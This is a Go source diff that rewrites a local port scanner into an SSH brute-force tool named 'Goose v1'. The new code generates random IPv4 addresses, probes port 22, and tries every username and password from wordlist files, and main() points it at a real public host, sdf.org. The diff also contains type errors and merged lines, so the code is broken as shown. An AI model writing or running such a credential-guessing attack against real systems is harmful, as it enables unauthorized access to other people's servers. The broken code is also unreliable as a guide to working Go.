@@ -1,98 +1,117 @@
 package main
 
 import (
-"strconv"
-"os"
-"log"
-"fmt"
-"net"
-"time"
+	"strconv"
+	"time"
+	"fmt"
+	"math/rand"
+	"os"
+	"bufio"
+	//"bytes"
+	"net"
+	"golang.org/x/crypto/ssh"
+	//"github.com/sfreiberg/simplessh"
 )
 
-func Portscan(ip string) (ports [1024]int) {
-	fmt.Println("\n")
-	startPort := 1
-	endPort := 1024
-	for loopPort := startPort; loopPort <= endPort; loopPort++ {
-		address := fmt.Sprintf("%s:%d", ip, loopPort)
-		conn, err := net.DialTimeout("tcp", address, time.Millisecond*100)
-		if err == nil {
-			conn.Close()
-			ports[loopPort] = loopPort
-		}
-	}
-	return ports
+type cred struct {
+	url      string
+	port     int
+	username string
+	password string
 }
 
-func Ipscan() (iplist [100]net.IP) {
-	addr, err := net.InterfaceAddrs()
+type creds []*cred
+
+func readFile(f string) (data []string, err error) {
+    b, err := os.Open(f)
+    if err != nil {
+        return
+    }
+    defer b.Close()    scanner := bufio.NewScanner(b)
+    for scanner.Scan() {
+        data = append(data, scanner.Text())
+    }
+    return
+}
+
+func randRange(min, max int) int {
+    return rand.Intn(max-min) + min
+}
+
+//this functions attempts to open an SSH connection with the target IP, using a username and password
+func sshConnect(ip, username, password string) bool {
+	fmt.Println("Scanning " + ip + "...")
+	sshConfig := &ssh.ClientConfig{
+		User:            username,
+		Auth:            []ssh.AuthMethod{ssh.Password(password)},
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+	}
+	conn, err := ssh.Dial("tcp", ip+":22", sshConfig)
+	time.Sleep(100 * time.Millisecond)
+	if err == nil {
+		conn.Close()
+		return true
+	}
+	return false
+}
+
+//this function checks if an IP has port 22 open
+func sshScan(ip string) bool {
+	fmt.Println("Scanning " + ip + "...")
+	conn, err := net.DialTimeout("tcp", ip+":22", 25*time.Second)
+	time.Sleep(100 * time.Millisecond)
+	if err == nil {
+		conn.Close()
+		return true
+	}
+	return false
+}
+
+//this function attempts to connect to the target IP with all possible combinations of usernames and passwords, provided by two list files
+func sshBrute(ip, usernameList, passwordList string) *cred {
+	fmt.Println("Brute-forcing " + ip + "...")
+	usernameList, err := readFile(usernameList)
 	if err != nil {
 		fmt.Println(err)
-		return
+		return false
 	}
-
-	for counter, addr := range addr {
-		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
-			if ipnet.IP.To4() != nil || ipnet.IP.To16 != nil {
-				iplist[counter] = ipnet.IP.To16()
+	passwordList, err := readFile(passwordList)
+	if err != nil {
+		fmt.Println(err)
+		return false
+	}
+	for _, username := range usernameList {
+		for _, password := range passwordList {
+			if sshConnect(ip, username, password) {
+				return &cred{url: ip, port: 22, username: username, password: password}
 			}
 		}
 	}
-	return iplist
+	return nil
 }
 
-func ScanNetwork() {
-	//lets test out this bitch 🔪
-	IPlist := Ipscan()
-	type IPWithPorts struct {
-		IP string
-		openPorts [1024]int
-	}
-	var allIPsWithPorts = [len(IPlist)]IPWithPorts{}
-	for i := range IPlist {
-		ports := Portscan(IPlist[i].String())
-		for p := range ports {
-			if ports[p] != 3000 {
-				allIPsWithPorts[i].openPorts = ports
-			}
-		}
-		allIPsWithPorts[i].IP = IPlist[i].String()
-		fmt.Println("We're on ", i, "of ", len(IPlist))
-	}
-	
-	var lines = []string{
-		"IPs with their open ports:",
-	}
-	for a := range allIPsWithPorts {
-		lines = append(lines, allIPsWithPorts[a].IP)
-		for range allIPsWithPorts[a].openPorts {
-			if allIPsWithPorts[a].openPorts[a] != 0 {
-				lines = append(lines, strconv.Itoa(allIPsWithPorts[a].openPorts[a]))
-			}
-		}
-		//lines = append(lines, "\n")
-	}
-
-	//lets write them out to a file now
-	f, err := os.Create("iplist.txt")
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer f.Close()
-	
-	for _, line := range lines {
-		_, err := f.WriteString(line + "\n")
-		if err != nil {
-			log.Fatal(err)
-		}
-	}
-	fmt.Println("Open ports logged to file. Go get em' killer.")
+//this function generates a random valid IPv4 address
+func genAddress() string {
+	rand.Seed(time.Now().UnixNano())
+	ip := fmt.Sprintf("%d.%d.%d.%d", randRange(1, 254), randRange(1, 254), randRange(1, 254), randRange(1, 254))
+	return ip
 }
 
 func main() {
+	// note to self, add an item in the array with cred_list[x] = &cred{url, username, password}
+	//var cred_list = make(creds, 50)
+
 	//adds some FLAVOR to the startup
 	ascii := "✩░▒▓▆▅▃▂▁𝐆𝐨𝐨𝐬𝐞 𝐯𝟏▁▂▃▅▆▓▒░✩"
 	fmt.Println(ascii)
+	
+	/*
+	fmt.Println("Starting Probing...")
+	go fmt.Println("Google: " + strconv.FormatBool(sshScan("google.com")))
+	fmt.Println("SDF: " + strconv.FormatBool(sshScan("sdf.org")))
+	*/
 
-	ScanNetwork()
+	fmt.Println("Starting Brute-Force...")
+	cred := sshBrute("sdf.org", "user.txt", "pass.txt")
+	fmt.Println(cred)
 }
